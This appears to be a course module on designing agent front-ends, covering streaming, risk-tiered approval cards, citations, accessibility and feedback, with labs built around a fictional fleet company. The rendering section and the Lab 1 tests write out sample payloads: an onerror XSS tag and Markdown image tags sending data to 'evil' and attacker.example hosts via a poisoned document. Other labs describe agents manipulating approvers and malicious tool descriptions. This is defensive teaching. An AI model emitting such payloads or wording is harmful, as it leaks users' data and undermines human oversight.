# D4 — Agent UX & front-ends

> **Level:** Expert (AI Solution Developer track) · **Duration:** 14h (theory 25% / labs 75%) · **Prerequisites:** Core C0–C19 and Gate G3; especially C7 (citations, security trimming), C9/C12 (MAF agents, HITL), C14 (judges, error analysis), C15 (feedback events), C16 (output handling, BOLA) · **Volatility:** High (AG-UI in MAF is preview; MCP Apps is a new official extension; host support varies)

## Why this matters

A proficient practitioner streams tokens into a chat box. An expert designs the **contract between the agent and the human**: what the agent is doing, what it intends to do, what it did, and on what evidence. They make agency legible without drowning the user. They make approvals resistant to rubber-stamping and to manipulation by the agent's own phrasing. They communicate uncertainty with signals that are actually calibrated, and keep the UI usable with a screen reader while text streams in. And they close the loop: every thumbs-down, edit and abandoned session becomes input to error analysis and evals.

Trakia's dispatchers work in a busy control room with three screens. The fleet manager approves maintenance plans from a phone between meetings. Customer-service agents paste Fleet Ops answers into emails to customers. The failure modes in this setting are UX failures with operational consequences:
- **automation bias:** a dispatcher approves a 12-action plan in two seconds because the summary sounded confident;
- **citation theatre:** a customer gets a "policy says…" answer whose footnote points to a superseded handbook version;
- **lost work:** the stream died at 80% and the agent's draft vanished;
- **injection:** the model emitted a `<script>` that ran in the console.

OWASP's agentic guidance calls for "human confirmation showing the raw action rather than the agent's summary" (against ASI09 Human-Agent Trust Exploitation). The EU AI Act requires disclosure of AI interaction (Art. 50). For high-risk systems it requires human oversight designed against automation bias (Art. 14), and that design obligation lives in the UI.

## Learning outcomes

1. **Implement** end-to-end streaming (model → MAF → ASP.NET Core → Blazor/React) with cancellation that stops billing, resumable streams, and safe rendering of partial Markdown.
2. **Choose and justify** an agent–UI integration: plain SSE, AG-UI events, MCP Apps (`ui://`), or a typed generative-UI component registry. Base the choice on interactivity, host and security.
3. **Design and build** HITL approval UX that shows raw actions, diffs, reversibility and cost, scales friction with risk, re-validates on the server, and measures rubber-stamping.
4. **Render** verifiable citations (passage-level, versioned, permission-trimmed) and **evaluate** citation accuracy.
5. **Communicate** uncertainty, partial results and errors with calibrated signals and standard phrasing, without leaking guardrail internals.
6. **Meet** WCAG 2.2 AA for streaming and approval flows (live regions, focus, keyboard, reduced motion, language tags) and **verify** it automatically.
7. **Capture** explicit and implicit feedback joined to traces, and **convert** it into error-analysis queues, eval cases and preference pairs.

## Concepts

### 1. Streaming: perceived latency, structure and control

- **What users perceive.** They feel time-to-first-*meaningful*-content, not TTFT. A streamed "Let me check…" followed by 4 seconds of silence is worse than an honest activity indicator. Stream **activity** (tool started, retrieving 3 documents) as well as text.
- **Streaming structure.** With structured outputs, stream partial JSON into a progressively rendered component (a plan table filling row by row) rather than showing raw JSON. MEAI `GetStreamingResponseAsync` and MAF `RunStreamingAsync` yield updates (`AgentResponseUpdate`) carrying text deltas, function-call content and usage. Map them to UI events.
- **Cancellation must reach the model.** Propagate the browser's abort → `HttpContext.RequestAborted` → `CancellationToken` into `RunStreamingAsync`, so the upstream call stops and stops billing. A "Stop" button that only hides the stream wastes tokens.
- **Resumability.** Mobile connections drop. Persist the stream (response ID + accumulated events) so a reconnect replays from the last event ID. The MAF Durable extension (prerelease) advertises reliable streaming via Redis. Otherwise, implement an event log keyed by run ID.
- **Transport.** For one-way streams use SSE (simple, proxy-friendly, `Last-Event-ID`). For Blazor Server/Interactive use SignalR (already in the circuit). Use WebSockets when the client must send mid-stream signals (barge-in, approvals) on the same channel.
- **Rendering safety (LLM05 Improper Output Handling):**
  - Model output is untrusted. Render Markdown with an allow-list sanitizer and never render HTML from the model.
  - Links: show the full domain and add `rel="noopener noreferrer"`. Block `javascript:` and data URIs.
  - Partial Markdown: unclosed code fences or tables during streaming need a tolerant renderer that re-renders the tail. Rendering each chunk independently corrupts output.
  - **Markdown image tags are an exfiltration channel** (`![x](https://evil/?q=secret)`). Allow images only from your own CDN.

### 2. Agent–UI integration options

| Option | What it is | Use when | Risks |
|---|---|---|---|
| Plain SSE of text + activity events | Your own event schema | Simple chat + activity timeline | You reinvent state sync and approvals |
| **AG-UI** | Event-based protocol for streaming agent runs (text, tool calls, state, HITL) to front-ends; originated with CopilotKit | Rich copilots with shared state between agent and UI | **MAF support is preview** (CopilotKit and ChatKit adapters); event names and versions should be pinned and verified |
| **MCP Apps** | Official MCP extension: a server declares interactive UI as a `ui://` resource, rendered by the host in a **sandboxed iframe**, communicating via JSON-RPC over `postMessage`, with text/structured fallback | The tool's UI should travel *with the tool* into any MCP Apps-capable host (IDE agents, chat clients, your app). The Azure Functions MCP extension supports MCP Apps | Host support varies; iframe sandbox and CSP must be strict; the UI is still untrusted from the host's view |
| Typed generative UI (component registry) | The model selects from *your* components and fills typed props (`ShowPlanTable(PlanDto)`, `ShowApproval(ApprovalDto)`) via tool calls or structured output | Dynamic but safe UIs | Keep the registry small and schema-validated |
| Model-generated HTML/JS | The model writes the UI | Prototyping only | XSS, injection, unreviewable behaviour: **don't ship** |

**Decision rule.** Default to a **typed component registry** over SSE or AG-UI for your own app. Use **MCP Apps** when the interactive surface belongs to a tool that other hosts (including coding agents) must render. Never render model-authored markup.

### 3. Approval UX that resists rubber-stamping

MAF surfaces approvals as typed requests: `ToolApprovalRequestContent` inside orchestrations and `RequestPort` in workflows. MEAI has `UserInputRequestContent` for function approval. The UI's job is to make the decision **informed and proportional**.

Anatomy of an approval card, generated from typed data and never from the agent's prose:
1. **Action, verbatim:** tool name and arguments, rendered human-readably (vehicle TRK-0142 / РВ 0142 КМ, slot Tue 21 Oct 08:00–12:00, Plovdiv bay 3).
2. **Effect and diff:** before → after (truck reassignment, route impact).
3. **Reversibility and blast radius:** "can be released until Mon 18:00" or "**irreversible**: sends SMS to 14 drivers".
4. **Cost:** € amount and budget remaining.
5. **Evidence:** links to the telematics trend and policy passage the agent used.
6. **The agent's rationale**, visually secondary and labelled as the AI's explanation.

**Friction proportional to risk.**
- Reversible, low-cost actions can be batch-approved.
- Irreversible or high-value actions need per-item confirmation, and the highest tier needs typed confirmation (re-type the vehicle ID) or four-eyes approval.

Batch approval of mixed-risk items is an anti-pattern.

**Server-side truth.**
- The approval payload from the client is a *claim*. The server re-loads the pending request by ID.
- The server checks that the approver is authorized for that resource. This is BOLA prevention, because Agent Service does not enforce per-user conversation authorization.
- The server checks that the request has not expired or changed since it was displayed (version or ETag), and executes exactly what was shown.

**Measure automation bias:**
- approval rate;
- median time-to-decision per risk tier;
- the "approve within 2 s" share;
- the rate at which approved actions are later reverted.

An approval rate near 100% with sub-2-second decisions on high-risk cards is an incident precursor, not a success metric. Inject **canary approvals** (seeded, clearly wrong actions in a training environment) to measure vigilance. Do not inject them into production.

### 4. Citations users can verify

- Cite **passages**, not documents. Clicking a citation opens the source at the highlighted chunk, showing the doc title, **version and effective date**, and the language (BG/EN).
- **Permission-trimmed** citations: never render a snippet the user cannot open. Security trimming happens at query time (C7). The UI must not show titles of documents the user lacks access to.
- **Abstention is a first-class state:** "No policy found that covers this; ask HR" with a link to the search the agent ran. It must not be a disguised guess.
- Evaluate **citation accuracy**: does the cited passage support the sentence? Use a binary judge per claim, calibrated (C14). Also check **staleness**: is the citation from a superseded version?

### 5. Uncertainty, partial results and errors

- **Do not display raw model "confidence %".** Self-reported numbers are poorly calibrated. Use signals you can validate:
  - retrieval coverage (were sources found? how many agree?);
  - calibrated judge or classifier scores (D1, D5);
  - agreement across samples for high-stakes answers.
  
  Map them to **three or four verbal levels** with fixed wording ("Based on 2 matching policy sections", "I couldn't confirm this — please check with…").
- **Partial results:** "3 of 4 depots checked; Varna timed out" with a retry control. A silent omission is worse than an explicit gap.
- **Guardrail blocks:** explain what the user can do without revealing detection internals. "I can't help with that request here" plus the support route, and log the block for review.
- **Rate limits and budget stops:** say what happened and when to retry. Never show a raw stack trace or a provider error.
- **Disclosure:** state clearly that the user is interacting with an AI (Art. 50). Label AI-drafted text that users will forward to customers ("Drafted by Fleet Ops Copilot — review before sending").

### 6. Accessibility for streaming and agentic UIs

- **Live regions.** Streamed text in an `aria-live="polite"` region floods screen readers token by token. Announce at **sentence or message completion**: buffer the live region and update the visual region continuously. Announce activity changes ("Searching maintenance manuals") once.
- **Focus management.** An approval dialog takes focus, traps it, labels the action, and returns focus on close. "Approve" must not be the default Enter action for irreversible tiers.
- **Keyboard:** every control is reachable without a mouse. Stop is a keyboard shortcut announced in the UI.
- **Reduced motion:** honour `prefers-reduced-motion` and disable typewriter animations and pulsing indicators.
- **Language:** set `lang="bg"` or `lang="en"` per message so screen readers use the right voice. Mixed-language citations get their own `lang`.
- **Contrast and target sizes:** WCAG 2.2 AA, including on the fleet manager's phone.
- Verify with **axe-core** in Playwright tests, plus a manual screen-reader pass (NVDA/VoiceOver) on the approval flow.

### 7. Feedback that becomes evals

| Signal | Capture | Use |
|---|---|---|
| Thumbs up/down + reason code (wrong, outdated, incomplete, unsafe, slow) | Event with `gen_ai.conversation.id`, response ID, prompt/model version | Error-analysis queue (C14); per-version dashboards (C15) |
| Free-text comment | Same event; PII-scrubbed | Open coding |
| Edit of an AI draft before sending | Diff size and kind | Strong implicit signal; edited pairs → DPO candidates (D1) |
| Retry / regenerate, copy, abandonment | Implicit events | Weak signals for sampling |
| Approval rejected + reason | Workflow event | Planner failure taxonomy (D2) |

Pipeline:
1. Events go to App Insights, joined to traces.
2. A weekly sample is drawn: all thumbs-down, plus a random 10% of the rest, plus outliers.
3. The sample goes through annotation, then a failure taxonomy, then new golden cases or judges.

Feedback is **not** a quality metric by itself, because the people who click are a skewed sample. It is a **sampling signal** for error analysis. Comments are personal data, so apply the retention rules.

### 8. Front-end stack choices

- **Blazor (.NET 10, Interactive Server/Auto)** fits internal tools (dispatcher console, back-office review queue). Streaming rides on SignalR, and C# end to end keeps the DTOs shared.
- **React + CopilotKit [Node]** fits the AG-UI path and the richest copilot interactions. It is also the most common ecosystem for AG-UI samples.
- **Teams** suits fleet managers, via Foundry agent publishing (announced Build 2026; verify current status). Approval cards there must follow the same anatomy (§3).
- **MCP Apps** are for tool UIs that must also appear inside coding agents and other MCP hosts.

**Misconceptions to unlearn:**
- "Streaming fixes latency." It fixes *perceived* latency only if something meaningful arrives early.
- "Show the chain of thought to build trust." Reasoning may be hidden or encrypted, and it is not a faithful audit trail. Show evidence and actions.
- "More confirmation dialogs = more safety." Undifferentiated friction trains people to click through.
- "Thumbs-down rate is our quality KPI."

## Tools & versions (as of Oct 2026)

| Tool / package | Purpose | Status | Notes |
|---|---|---|---|
| `Microsoft.Agents.AI` (MAF 1.x) | `RunStreamingAsync`, `AgentResponseUpdate`, `ToolApprovalRequestContent`, `RequestPort` | GA | |
| MAF AG-UI adapters (CopilotKit, ChatKit) | Agent ↔ UI event protocol | **Preview** | Verify package names and AG-UI event schema version |
| CopilotKit | React AG-UI client | OSS | **[Node]** |
| MCP Apps extension (`ui://` resources) | Tool-carried interactive UI | Official extension (spec 2026-07-28) | Host support varies, so verify your target hosts |
| `ModelContextProtocol` C# SDK 2.0 | MCP server incl. extensions | Announced Aug 2026; new APIs `[Experimental]` (MCPEXP001) | Pin version |
| Azure Functions MCP extension | MCP server incl. MCP Apps | Available, C# isolated only | Streamable HTTP |
| Microsoft.Extensions.AI 10.x | Streaming, `UserInputRequestContent` | GA | |
| Blazor (.NET 10) | Internal UIs | GA | |
| Playwright + `@axe-core/playwright` | E2E + accessibility checks | OSS | **[Node]**; Playwright test agents from C11 |
| Application Insights / OTel | Feedback events joined to traces | GA | GenAI semconv still "Development" |

## Labs

Lab repo: `trakia-fleetops`, folders `src/Trakia.Dispatch.Web` (Blazor), `web/fleet-copilot` (React, **[Node]**) and `src/Trakia.Mcp` (the C8 MCP server).

### Lab 1 — Streaming dispatcher console in Blazor (≈3h)

- **Goal:** A dispatcher console that streams answers and agent activity, cancels for real, survives reconnects and renders safely.
- **Start state:** tag `d4/lab1-start`. It contains the Fleet Assistant agent (C9) and an empty Blazor page.
- **Steps:**
  1. Expose an SSE endpoint mapping MAF updates to a small event schema (`text.delta`, `activity.start`, `activity.end`, `citation`, `done`, `error`), each with an `id` for `Last-Event-ID`:
     ```csharp
     app.MapGet("/runs/{runId}/events", async (string runId, HttpContext http, RunStore store, CancellationToken ct) =>
     {
         http.Response.Headers.ContentType = "text/event-stream";
         var from = http.Request.Headers["Last-Event-ID"].FirstOrDefault();
         await foreach (var evt in store.ReplayThenFollowAsync(runId, from, ct))   // persisted event log
             await http.Response.WriteAsync($"id: {evt.Id}\nevent: {evt.Type}\ndata: {evt.Json}\n\n", ct);
     });
     // Producer side: await foreach (var u in agent.RunStreamingAsync(input, session, cancellationToken: runCt)) store.Append(runId, UiEvent.From(u));
     ```
  2. Wire the Stop button to cancel `runCt` server-side, and verify that the upstream model call stops (usage stops growing in the trace).
  3. Render Markdown with an allow-list sanitizer and a tolerant partial renderer. Block external images and `javascript:` links.
  4. Show an activity timeline (tools, retrievals) separate from the answer. Add a buffered `aria-live="polite"` region that announces complete sentences.
  5. Emit `ui.first_meaningful_content_ms` as a client metric and compare it with server TTFT.
- **Break it:**
  - Kill the network for 5 s mid-answer: the stream must resume with no duplicated or missing text.
  - Make the model output `<img src=x onerror=alert(1)>` and `![p](https://attacker.example/?d=…)` through a poisoned document: neither may execute or load.
- **Acceptance criteria:**
  - The Playwright tests `StreamResume`, `StopCancelsUpstream` (asserted via the trace usage counter) and `OutputSanitization` pass.
  - axe-core reports 0 serious or critical violations on the console page.
  - First meaningful content P95 is ≤ 1.2 s on the eval set.
- **Stretch:** Progressive structured rendering. Stream the partial JSON of a `ShiftSummary` into a table that fills in row by row.

### Lab 2 — AG-UI copilot with shared plan state and risk-tiered approvals (≈3.5h) [Node]

- **Goal:** A React copilot for the fleet manager that co-edits the D2 weekly plan with the agent and approves actions safely.
- **Start state:** tag `d4/lab2-start`. It contains the D2 planner (or a stub) exposed through MAF's AG-UI adapter (preview) and a CopilotKit app skeleton.
- **Steps:**
  1. Expose the planner via the MAF AG-UI endpoint. Share `PlanDraft` state with the UI (state snapshots and deltas). Verify the adapter's API and the event names against the pinned version.
  2. Build the approval card component from typed `ToolApprovalRequestContent` data: verbatim action, diff, reversibility, € cost, evidence links, and a secondary "AI rationale". Implement risk tiers:
     - T1: reversible and < €200, batchable;
     - T2: reversible and ≥ €200, per-item;
     - T3: irreversible, per-item with typed confirmation.
  3. On the server, the approval endpoint loads the pending request by ID, checks the approver's role and resource scope, checks the ETag/version, executes exactly the shown arguments, and writes an audit event.
  4. Instrument the approval metrics: decision time per tier, approval rate, and later reversions.
- **Break it:**
  - Tamper with the approval POST in DevTools (change the vehicle ID or the amount). The server must reject it.
  - Have the agent phrase a T3 action reassuringly ("just a quick routine notification"). The card must still show "irreversible" and the recipient count from typed data.
  - Run a scripted "approval fatigue" session with 30 T1 cards and 1 hidden wrong T3 card, and record whether testers catch it.
- **Acceptance criteria:**
  - `ApprovalSecurityTests` pass: 0 tampered executions, BOLA test (manager A cannot approve depot B's plan), expired request rejected.
  - Every irreversible action requires typed confirmation.
  - Approval metrics appear in the dashboard.
- **Stretch:** Port the approval card to a Teams Adaptive Card with the same anatomy and server-side validation.

### Lab 3 — An MCP App: maintenance booking form travelling with the tool (≈2h)

- **Goal:** Make `book_maintenance` render its own interactive form in any MCP Apps-capable host, with a text fallback.
- **Start state:** tag `d4/lab3-start` (the Trakia MCP server on the C# SDK 2.0, or the Functions MCP extension variant).
- **Steps:**
  1. Add a `ui://trakia/booking-form` resource: a small, self-contained HTML/JS app with a strict CSP, no external origins and no inline event handlers. It talks to the host via JSON-RPC over `postMessage` per the MCP Apps extension.
  2. Make `book_maintenance` return a structured result referencing the UI resource. Hosts without MCP Apps get the text/structured fallback (a slot list and the instruction to call again with a slot ID).
  3. The form submits through the host back to the tool. The server re-validates the slot, the vehicle and the caller's permissions.
  4. Test it in at least one MCP Apps-capable host (verify which IDE/chat hosts support it in your pinned versions) and in a host without support.
- **Break it:** Make the form try to `fetch` an external URL and read `parent.document`. Both must fail under the sandbox and CSP. Then make a malicious tool description request "render ui://other-server/…". The host must not cross server boundaries.
- **Acceptance criteria:**
  - The `McpAppsContractTests` (resource served with the correct MIME type and CSP, fallback present, server-side validation) pass.
  - A manual check in one capable host is recorded with a screenshot in the PR.
- **Stretch:** Compare the same interaction implemented as AG-UI generative UI (a typed component) vs an MCP App. Record where each one renders and who owns its security.

### Lab 4 — Citations, uncertainty and the feedback-to-evals loop, plus an accessibility audit (≈2h)

- **Goal:** Make answers verifiable and honest, and turn user reactions into eval improvements.
- **Start state:** tag `d4/lab4-start`.
- **Steps:**
  1. Implement passage-level citations with version and effective date, opening the source viewer at the highlighted chunk. Hide citations the user cannot open, and add a test with an HR-only document.
  2. Implement an `AnswerAssurance` mapper from validated signals (retrieval hits, source agreement, judge score) to three verbal levels with fixed BG/EN phrasing, including an explicit abstention state.
  3. Add feedback capture (thumbs + reason codes + optional comment, plus draft-edit diffs in the customer-email composer) joined to `gen_ai.conversation.id` and the response ID.
  4. Write a weekly job that samples the feedback into the C14 annotation tool queue, and a script that promotes adjudicated cases into the golden set.
  5. Run the axe-core suite across all pages, and do a manual NVDA/VoiceOver pass of the approval flow. Log the issues and fix them.
- **Break it:** Index a superseded fleet-policy version. The answer must cite the current version, or flag the conflict. Then set the judge threshold so loose that "high assurance" appears on a wrong answer, and catch it with the calibration check.
- **Acceptance criteria:**
  - Citation accuracy is ≥ 95% and stale citations are 0 on the 40-question citation eval.
  - No permission-violating snippet is rendered.
  - Assurance levels are calibrated: the "high" level is ≥ 95% correct on the eval set.
  - Feedback events are queryable in KQL and joined to traces.
  - 0 serious or critical axe violations.
- **Stretch:** Generate DPO preference-pair candidates from the customer-email draft edits (D1 hand-off), with PII scrubbing.

## Kata

**"Design the card" (25 min, repeat 4×).** You get a tool schema and the agent's proposed call:
- Variant 1: cancel a customer shipment.
- Variant 2: reassign 6 drivers.
- Variant 3: order €4,800 of parts.
- Variant 4: send a delay notice to 120 customers.

Sketch the approval card: verbatim fields, diff, reversibility, cost, evidence, risk tier and friction, server-side checks. Then name one way the agent could manipulate the decision and how your design blocks it. Peer-review against the §3 anatomy checklist.

## Product increment — Fleet Ops Copilot

Fleet Ops Copilot now has three front-ends:
- A **Blazor dispatcher console** with resumable, cancellable, sanitized streaming and an activity timeline.
- A **React AG-UI copilot** for fleet managers. It co-edits the weekly plan and uses risk-tiered, server-validated approvals with automation-bias metrics.
- An **MCP App** booking form that renders wherever the Trakia MCP server is used, coding agents included.

Answers carry passage-level, versioned, permission-trimmed citations and calibrated assurance wording. Feedback flows into the eval pipeline weekly.

## Factory increment — your agentic SDLC

- Playwright planner/generator/healer agents (C11) maintain the E2E suites for both front-ends. A CI rule requires human review for healer diffs touching approval or sanitization tests.
- `@axe-core/playwright` runs in CI with a zero serious/critical gate.
- A `/approval-card` skill scaffolds a typed approval DTO, the card component (Blazor and React), the server validation endpoint and the security tests from a tool schema.
- The UI's eval cases (citation accuracy, assurance calibration, sanitization) run in the same `dotnet test` + Playwright pipeline as the backend evals.

## Assessment

| Criterion | Novice | Competent | Proficient | Expert |
|---|---|---|---|---|
| Streaming & robustness | Text appears eventually | Streams text | Activity events, cancellation, sanitization | Resumable event log; cancellation stops upstream billing; tolerant partial rendering; measured first meaningful content |
| Integration choice | Ad-hoc | Uses one protocol | Justifies SSE vs AG-UI vs MCP Apps | Typed component registry + MCP Apps where tools travel; security ownership explicit per surface |
| Approval UX | "Approve?" with agent text | Shows arguments | Typed card, risk tiers, server re-validation | Manipulation-resistant, BOLA-safe, automation-bias metrics with thresholds and canary training |
| Honesty signals | None | Document-level citations | Passage citations, abstention state | Versioned, permission-trimmed citations with measured accuracy; calibrated assurance levels |
| Accessibility & feedback | Not considered | axe run once | AA in CI; feedback captured | Screen-reader-friendly streaming; feedback → error analysis → golden set loop running |

**Auto-checked:** `StreamResume`, `StopCancelsUpstream`, `OutputSanitization`, `ApprovalSecurityTests`, `McpAppsContractTests`, the citation and assurance evals, the axe-core gate, and the KQL feedback-join test.

## Common pitfalls

- A Stop button that hides the stream but leaves the model generating, and billing.
- Rendering model HTML, or allowing external Markdown images, which creates XSS and an exfiltration channel.
- Approval cards built from the agent's natural-language summary.
- Trusting the client's approval payload, and no ownership check (BOLA).
- One-click "approve all" across mixed risk tiers.
- Showing self-reported confidence percentages.
- Document-level citations to superseded versions, and snippet leaks across permissions.
- `aria-live` on every token, which overwhelms screen-reader users.
- Treating the thumbs-down rate as the quality KPI instead of a sampling signal.
- Building on a preview protocol without pinning its version and keeping a fallback.


## References

- MAF 1.0 announcement (AG-UI/CopilotKit/ChatKit adapters preview): https://devblogs.microsoft.com/agent-framework/microsoft-agent-framework-version-1-0/
- Microsoft Learn — MAF human-in-the-loop (`RequestPort`, `ToolApprovalRequestContent`): https://learn.microsoft.com/en-us/agent-framework/workflows/human-in-the-loop
- AG-UI documentation: https://docs.ag-ui.com
- MCP 2026-07-28 changelog and MCP Apps extension: https://modelcontextprotocol.io/specification/2026-07-28/changelog ; https://aaif.io/blog/mcp-2026-07-28-whats-changing-and-how-to-migrate
- Microsoft Learn — Azure Functions MCP bindings (incl. MCP Apps): https://learn.microsoft.com/en-us/azure/azure-functions/functions-bindings-mcp
- Microsoft .NET blog — AI essentials (`UserInputRequestContent`, streaming): https://devblogs.microsoft.com/dotnet/dotnet-ai-essentials-the-core-building-blocks-explained/
- OWASP Top 10 for LLM Applications 2025 (LLM05 Improper Output Handling): https://genai.owasp.org/llm-top-10/
- OWASP Top 10 for Agentic Applications (ASI09; "show the raw action"): https://cycode.com/blog/owasp-top-10-agentic-applications/
- Azure Architecture Center — Baseline Foundry chat RA (BOLA warning): https://learn.microsoft.com/en-us/azure/architecture/ai-ml/architecture/baseline-microsoft-foundry-chat
- Hamel Husain — Evals FAQ (feedback as a sampling signal, error analysis): https://hamel.dev/blog/posts/evals-faq/
- Microsoft HAX Toolkit / Responsible AI resources: https://www.microsoft.com/en-us/ai/responsible-ai
- W3C WCAG 2.2: https://www.w3.org/TR/WCAG22/
- Playwright test agents: https://playwright.dev/docs/test-agents
